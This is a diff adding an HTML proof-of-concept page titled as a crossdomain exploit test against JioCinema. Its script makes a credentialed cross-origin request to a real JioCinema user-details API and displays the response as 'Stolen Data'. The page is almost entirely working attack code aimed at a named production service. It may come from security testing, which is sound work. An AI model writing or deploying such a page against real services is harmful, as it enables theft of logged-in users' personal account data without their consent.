@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JioCinema Crossdomain Exploit Test</title>
+</head>
+<body>
+    <h1>Testing Insecure crossdomain.xml</h1>
+    <p>If successful, this page will fetch and display sensitive data from JioCinema.</p>
+
+    <script>
+        fetch("https://prod-sports-eng.jiocinema.com/api/user-details", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => alert("Stolen Data: " + data))
+        .catch(error => console.log("Blocked or No Data:", error));
+    </script>
+</body>
+</html>
